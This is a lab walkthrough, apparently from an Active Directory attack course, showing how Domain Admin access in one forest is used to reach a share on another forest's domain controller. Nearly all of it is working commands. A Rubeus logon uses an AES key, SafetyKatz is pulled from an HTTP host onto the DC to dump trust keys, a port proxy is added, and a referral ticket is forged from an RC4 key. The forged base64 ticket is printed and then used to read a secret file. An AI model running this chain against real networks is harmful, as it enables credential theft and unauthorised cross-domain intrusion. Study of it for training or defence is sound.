# 🌡️ With DA privilege, get access to SharedwithDCorp share on the an other DC

We need the trust key for the trust between dollarcorp and eurocrop, which can be retrieved using Mimikatz or SafetyKatz.

Let's start by Starting a process with DA privileges.

start by encoding "asktgt" and spawn the process ->

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Now let's copy loader.exe on dcorp-dc and extract creds ->

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
winrs -r:dcorp-dc cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.13
```

<figure><img src="../../.gitbook/assets/image (1151).png" alt=""><figcaption></figcaption></figure>

On the DA process, let's encode lsadump::trust and run the command:

```
C:\Users\Public\Loader.exe -path http://172.16.100.13:8787/SafetyKatz.exe -args "%Pwn% /patch" "exit"
```

<figure><img src="../../.gitbook/assets/image (1152).png" alt=""><figcaption></figcaption></figure>

now that we have those, let's use rubeus to Forge a referral ticket. Note that we are not injecting any SID History here as it would be filtered out. Let's start by encoding "silver"

<figure><img src="../../.gitbook/assets/image (1153).png" alt=""><figcaption></figcaption></figure>

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:c946390624f38d6432fca71c189d4203 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
```

<figure><img src="../../.gitbook/assets/image (1154).png" alt=""><figcaption></figcaption></figure>

base64 ticket:

```
 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
```

Then we can use this ticket to run the follwing command:

```
C:\AD\Tools\Rubeus.exe asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket: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
```

<figure><img src="../../.gitbook/assets/image (1155).png" alt=""><figcaption></figcaption></figure>

Once the ticket is injected, we can access explicitly shared resources on eurocorp-dc.

<figure><img src="../../.gitbook/assets/image (1156).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1157).png" alt=""><figcaption></figcaption></figure>

and we could read the content of the file like this:

```
type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt
```

<figure><img src="../../.gitbook/assets/image (1158).png" alt=""><figcaption><p>Note that the only way to enumerate accessible resources (service on a machine) in eurocorp would be to request a TGS for each one and then attempt to access it.</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1160).png" alt=""><figcaption></figcaption></figure>

If needed there are 2 other techniques in the course using Invoke-Mmimkatz and old Kekeo and BetterSafetyKatz
